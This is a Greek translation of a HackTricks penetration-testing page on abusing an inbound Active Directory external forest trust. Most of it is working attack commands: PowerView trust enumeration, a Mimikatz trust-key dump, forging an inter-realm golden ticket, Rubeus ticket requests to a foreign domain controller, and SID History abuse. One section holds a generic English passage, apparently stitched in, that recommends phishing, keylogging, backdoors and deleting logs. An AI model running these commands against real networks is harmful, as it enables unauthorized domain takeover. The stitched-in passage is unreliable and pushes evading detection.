# Εξωτερικό Δικτυακό Περιβάλλον - OneWay (Εισερχόμενο) ή διπλής κατεύθυνσης

<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Εργάζεστε σε μια **εταιρεία κυβερνοασφάλειας**; Θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks**; Ή θέλετε να έχετε πρόσβαση στην **τελευταία έκδοση του PEASS ή να κατεβάσετε το HackTricks σε μορφή PDF**; Ελέγξτε τα [**ΠΑΚΕΤΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Ανακαλύψτε την [**Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Συμμετάσχετε** στην [**💬**](https://emojipedia.org/speech-balloon/) [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** με στο **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στο [αποθετήριο hacktricks](https://github.com/carlospolop/hacktricks) και [αποθετήριο hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

Σε αυτό το σενάριο, ένα εξωτερικό τομέα εμπιστεύεται εσάς (ή και οι δύο εμπιστεύονται ο ένας τον άλλο), έτσι ώστε να μπορείτε να αποκτήσετε κάποια είδους πρόσβαση σε αυτόν.

## Απαρίθμηση

Καταρχήν, πρέπει να **απαριθμήσετε** την **εμπιστοσύνη**:
```powershell
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM

# Get name of DC of the other domain
Get-DomainComputer -Domain domain.external -Properties DNSHostName
dnshostname
-----------
dc.domain.external

# Groups that contain users outside of its domain and return its members
Get-DomainForeignGroupMember -Domain domain.external
GroupDomain             : domain.external
GroupName               : Administrators
GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=domain,DC=external
MemberDomain            : domain.external
MemberName              : S-1-5-21-3263068140-2042698922-2891547269-1133
MemberDistinguishedName : CN=S-1-5-21-3263068140-2042698922-2891547269-1133,CN=ForeignSecurityPrincipals,DC=domain,
DC=external

# Get name of the principal in the current domain member of the cross-domain group
ConvertFrom-SID S-1-5-21-3263068140-2042698922-2891547269-1133
DEV\External Admins

# Get members of the cros-domain group
Get-DomainGroupMember -Identity "External Admins" | select MemberName
MemberName
----------
crossuser

# Lets list groups members
## Check how the "External Admins" is part of the Administrators group in that DC
Get-NetLocalGroupMember -ComputerName dc.domain.external
ComputerName : dc.domain.external
GroupName    : Administrators
MemberName   : SUB\External Admins
SID          : S-1-5-21-3263068140-2042698922-2891547269-1133
IsGroup      : True
IsDomain     : True

# You may also enumerate where foreign groups and/or users have been assigned
# local admin access via Restricted Group by enumerating the GPOs in the foreign domain.
```
Στην προηγούμενη αναγνώριση βρέθηκε ότι ο χρήστης **`crossuser`** βρίσκεται μέσα στην ομάδα **`External Admins`** που έχει **δικαιώματα διαχειριστή** μέσα στο **DC του εξωτερικού τομέα**.

## Αρχική Πρόσβαση

Εάν **δεν** βρήκατε κάποια **ειδική** πρόσβαση του χρήστη σας στον άλλο τομέα, μπορείτε ακόμα να επιστρέψετε στην Μεθοδολογία AD και να προσπαθήσετε να αναβαθμίσετε τα δικαιώματα από έναν μη προνομιούχο χρήστη (πράγματα όπως το kerberoasting για παράδειγμα):

Μπορείτε να χρησιμοποιήσετε τις λειτουργίες του **Powerview** για να αναγνωρίσετε τον **άλλο τομέα** χρησιμοποιώντας την παράμετρο `-Domain` όπως εδώ:
```powershell
Get-DomainUser -SPN -Domain domain_name.local | select SamAccountName
```
## Προσωποποίηση

### Σύνδεση

Χρησιμοποιώντας μια κανονική μέθοδο με τα διαπιστευτήρια των χρηστών που έχουν πρόσβαση στον εξωτερικό τομέα, θα πρέπει να μπορείτε να αποκτήσετε πρόσβαση:
```powershell
Enter-PSSession -ComputerName dc.external_domain.local -Credential domain\administrator
```
### Κατάχρηση του SID History

Μπορείτε επίσης να καταχραστείτε το [**SID History**](sid-history-injection.md) σε ένα δάσος εμπιστοσύνης.

Εάν ένας χρήστης μεταφερθεί **από ένα δάσος σε ένα άλλο** και **δεν είναι ενεργοποιημένο το SID Filtering**, τότε είναι δυνατό να **προστεθεί ένα SID από το άλλο δάσος**, και αυτό το **SID** θα **προστεθεί** στο **token του χρήστη** κατά την πιστοποίηση **σε όλη την εμπιστοσύνη**.

{% hint style="warning" %}
Για να θυμηθείτε, μπορείτε να λάβετε το κλειδί υπογραφής με την εντολή
```powershell
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.domain.local
```
{% endhint %}

Μπορείτε να **υπογράψετε** με το **αξιόπιστο** κλειδί ένα **TGT που προσωποποιεί** τον χρήστη της τρέχουσας domain.
```bash
# Get a TGT for the cross-domain privileged user to the other domain
Invoke-Mimikatz -Command '"kerberos::golden /user:<username> /domain:<current domain> /SID:<current domain SID> /rc4:<trusted key> /target:<external.domain> /ticket:C:\path\save\ticket.kirbi"'

# Use this inter-realm TGT to request a TGS in the target domain to access the CIFS service of the DC
## We are asking to access CIFS of the external DC because in the enumeration we show the group was part of the local administrators group
Rubeus.exe asktgs /service:cifs/dc.doamin.external /domain:dc.domain.external /dc:dc.domain.external /ticket:C:\path\save\ticket.kirbi /nowrap

# Now you have a TGS to access the CIFS service of the domain controller
```
### Πλήρης τρόπος εκμετάλλευσης ταυτότητας χρήστη

To fully impersonate a user, follow these steps:

1. Obtain the user's credentials: This can be done through various methods such as phishing, keylogging, or password cracking.

2. Gain administrative privileges: If the user does not have administrative privileges, escalate your privileges to gain full control over the system.

3. Impersonate the user: Use the obtained credentials to log in as the user. This can be done by using tools like Mimikatz to extract and inject the user's credentials.

4. Maintain persistence: To ensure continued access, establish persistence mechanisms such as creating a backdoor or modifying system settings.

5. Cover your tracks: Delete any logs or traces of your activities to avoid detection.

By following these steps, you can fully impersonate a user and gain unauthorized access to their accounts and resources.
```bash
# Get a TGT of the user with cross-domain permissions
Rubeus.exe asktgt /user:crossuser /domain:sub.domain.local /aes256:70a673fa756d60241bd74ca64498701dbb0ef9c5fa3a93fe4918910691647d80 /opsec /nowrap

# Get a TGT from the current domain for the target domain for the user
Rubeus.exe asktgs /service:krbtgt/domain.external /domain:sub.domain.local /dc:dc.sub.domain.local /ticket:doIFdD[...snip...]MuSU8= /nowrap

# Use this inter-realm TGT to request a TGS in the target domain to access the CIFS service of the DC
## We are asking to access CIFS of the external DC because in the enumeration we show the group was part of the local administrators group
Rubeus.exe asktgs /service:cifs/dc.doamin.external /domain:dc.domain.external /dc:dc.domain.external /ticket:doIFMT[...snip...]5BTA== /nowrap

# Now you have a TGS to access the CIFS service of the domain controller
```
<details>

<summary><strong>Μάθετε το hacking του AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Εργάζεστε σε μια **εταιρεία κυβερνοασφάλειας**; Θέλετε να δείτε την **εταιρεία σας να διαφημίζεται στο HackTricks**; Ή θέλετε να έχετε πρόσβαση στην **τελευταία έκδοση του PEASS ή να κατεβάσετε το HackTricks σε μορφή PDF**; Ελέγξτε τα [**ΠΑΚΕΤΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Ανακαλύψτε την [**Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Συμμετάσχετε στην** [**💬**](https://emojipedia.org/speech-balloon/) [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** με στο **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Μοιραστείτε τα κόλπα σας στο hacking υποβάλλοντας PRs στο [αποθετήριο hacktricks](https://github.com/carlospolop/hacktricks) και [αποθετήριο hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
